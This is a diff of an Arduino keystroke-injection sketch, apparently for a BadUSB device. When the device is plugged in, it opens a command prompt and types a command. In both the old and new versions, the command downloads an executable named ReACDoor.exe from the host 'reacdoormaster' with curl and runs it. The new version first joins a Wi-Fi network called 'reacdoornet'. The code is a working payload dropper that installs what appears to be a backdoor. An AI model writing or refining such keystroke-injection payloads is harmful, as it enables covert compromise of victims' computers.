@@ -23,7 +23,7 @@ void setup() {
   delay(1000);
   Keyboard.println("cmd");
   delay(1000);
-  Keyboard.println(R"(cd %appdata% && curl -O http://reacdoormaster:80/ReACDoor.exe && (start ReACDoor.exe) & exit)");
+  Keyboard.println(R"(netsh wlan connect name="reacdoornet" & timeout /t 5 /nobreak >nul & cd /d %appdata% & curl -O http://reacdoormaster/ReACDoor.exe & if exist ReACDoor.exe start ReACDoor.exe & exit)");
   //Keyboard.press(KEY_RETURN);
   //Keyboard.releaseAll();
 }
